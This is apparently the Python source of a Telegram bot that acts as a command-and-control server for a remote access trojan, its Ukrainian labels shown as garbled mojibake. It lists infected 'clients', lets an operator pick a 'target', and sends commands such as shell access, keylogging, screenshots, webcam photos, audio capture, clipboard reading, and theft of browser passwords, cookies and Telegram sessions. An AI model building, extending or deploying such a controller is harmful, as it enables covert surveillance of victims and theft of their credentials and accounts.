# bot.py

# bot_server.py

import os
from dotenv import load_dotenv
import logging

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Updater, CommandHandler, CallbackQueryHandler,
    MessageHandler, Filters, CallbackContext
)

# ================== –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è ==================
BOT_TOKEN = "tut bot token"

# –®–∞–±–ª–æ–Ω –º–µ–Ω—é —Ñ—É–Ω–∫—Ü—ñ–π
FUNCTION_MENU = [
    ["sysinfo",      "–°–∏—Å—Ç–µ–º–Ω–∞ —ñ–Ω—Ñ–æ"],
    ["ls",           "–§–∞–π–ª–æ–≤–∏–π –º–µ–Ω–µ–¥–∂–µ—Ä"],
    ["ps",           "–°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—ñ–≤"],
    ["kill",         "–ó–∞–≤–µ—Ä—à–∏—Ç–∏ –ø—Ä–æ—Ü–µ—Å"],
    ["shell",        "Shell-–∫–æ–º–∞–Ω–¥–∏"],
    ["screenshot",   "–°–∫—Ä—ñ–Ω—à–æ—Ç"],
    ["keylog",       "–ö–µ–π–ª–æ–≥–µ—Ä"],
    ["audio",        "–ê—É–¥—ñ–æ"],
    ["photo",        "–§–æ—Ç–æ –∑ –∫–∞–º–µ—Ä–∏"],
    ["livescreen",   "Live-—Å—Ç—Ä—ñ–º –µ–∫—Ä–∞–Ω—É"],
    ["clip",         "–ë—É—Ñ–µ—Ä –æ–±–º—ñ–Ω—É"],
    ["update",       "–ê–≤—Ç–æ-–æ–Ω–æ–≤–ª–µ–Ω–Ω—è"],
    ["wifi",         "Wi-Fi —Å–∫–∞–Ω–µ—Ä"],
    ["run",          "–ó–∞–ø—É—Å–∫ .exe"],
    ["lock",         "–ë–ª–æ–∫/—Ä–æ–∑–±–ª. –µ–∫—Ä–∞–Ω"],
    ["shutdown",     "–í–∏–º–∫–Ω—É—Ç–∏ –ü–ö"],
    ["reboot",       "–ü–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏"],
    ["pw",           "–ü–∞—Ä–æ–ª—ñ –±—Ä–∞—É–∑–µ—Ä–∞"],
    ["cookies",      "–ö—É–∫–∏ –±—Ä–∞—É–∑–µ—Ä–∞"],
    ["history",      "–Ü—Å—Ç–æ—Ä—ñ—è –±—Ä–∞—É–∑–µ—Ä–∞"],
    ["tgsession",    "Telegram session"],
    ["getlink",      "–ì–µ–Ω–µ—Ä. –ª—ñ–Ω–∫"],
]

# –ö–ª—ñ—î–Ω—Ç–∏: client_id ‚Üí chat_id
clients = {}
current_client = None

# ================== –û–±—Ä–æ–±–∫–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó ==================
def handle_register(update: Update, ctx: CallbackContext):
    text = update.message.text.strip()
    if text.startswith("/register"):
        # –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –≤—ñ–¥ –∫–ª—ñ—î–Ω—Ç–∞: "/register CLIENT_ID"
        parts = text.split(" ", 1)
        if len(parts) == 2:
            client_id = parts[1]
            clients[client_id] = update.effective_chat.id
            update.message.reply_text(f"‚úÖ –ó–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–æ –∫–ª—ñ—î–Ω—Ç–∞ `{client_id}`", parse_mode="Markdown")

# ================== –ö–æ–º–∞–Ω–¥–∞ /clients ==================
def cmd_clients(update: Update, ctx: CallbackContext):
    if not clients:
        update.message.reply_text("‚ö†Ô∏è –ñ–æ–¥–Ω–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞ –Ω–µ –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–æ.")
        return
    keyboard = [
        [InlineKeyboardButton(cid, callback_data=f"select:{cid}")]
        for cid in clients
    ]
    update.message.reply_text("üîç –û–±—Ä—ñ—Ç—å –∫–ª—ñ—î–Ω—Ç–∞:", reply_markup=InlineKeyboardMarkup(keyboard))

# ================== –í–∏–±—ñ—Ä –∫–ª—ñ—î–Ω—Ç–∞ ==================
def select_client(cb: Update, ctx: CallbackContext):
    global current_client
    data = cb.callback_query.data  # "select:CLIENT_ID"
    client_id = data.split(":",1)[1]
    current_client = client_id
    # –°—Ç–≤–æ—Ä—é—î–º–æ –º–µ–Ω—é —Ñ—É–Ω–∫—Ü—ñ–π
    kb = []
    row = []
    for cmd, label in FUNCTION_MENU:
        row.append(InlineKeyboardButton(label, callback_data=f"cmd:{cmd}"))
        if len(row) == 2:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    # –î–æ–¥–∞—î–º–æ –∫–Ω–æ–ø–∫—É –ù–∞–∑–∞–¥
    kb.append([InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="back")])
    cb.callback_query.edit_message_text(
        f"üë§ –¶—ñ–ª—å: `{client_id}`\n–û–±—Ä—ñ—Ç—å –¥—ñ—é:", parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(kb)
    )

# ================== –û–±—Ä–æ–±–∫–∞ –æ–±—Ä–∞–Ω–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó ==================
def handle_command(cb: Update, ctx: CallbackContext):
    global current_client
    data = cb.callback_query.data  # "cmd:sysinfo" –∞–±–æ "back"
    if data == "back":
        # –ü–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –¥–æ —Å–ø–∏—Å–∫—É –∫–ª—ñ—î–Ω—Ç—ñ–≤
        cb.callback_query.edit_message_text("üîç –û–±—Ä—ñ—Ç—å –∫–ª—ñ—î–Ω—Ç–∞:")
        return cmd_clients(cb.callback_query, ctx)
    _, cmd = data.split(":",1)
    chat_id = clients.get(current_client)
    if not chat_id:
        cb.callback_query.answer("‚ùå –ö–ª—ñ—î–Ω—Ç –æ—Ñ–ª–∞–π–Ω", show_alert=True)
    else:
        # –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ —Ç–µ–∫—Å—Ç–æ–≤—É –∫–æ–º–∞–Ω–¥—É –∫–ª—ñ—î–Ω—Ç—É
        ctx.bot.send_message(chat_id, f"/{cmd}")
        cb.callback_query.answer(f"‚ñ∂Ô∏è –í—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ /{cmd} –∫–ª—ñ—î–Ω—Ç—É")

# ================== –û—Å–Ω–æ–≤–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è ==================
def main():
    logging.basicConfig(level=logging.INFO)
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    # –û–±—Ä–æ–±–Ω–∏–∫–∏
    dp.add_handler(MessageHandler(Filters.text & Filters.private, handle_register))
    dp.add_handler(CommandHandler("clients", cmd_clients))
    dp.add_handler(CallbackQueryHandler(select_client, pattern="^select:"))
    dp.add_handler(CallbackQueryHandler(handle_command, pattern="^cmd:"))
    dp.add_handler(CallbackQueryHandler(handle_command, pattern="^back$"))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
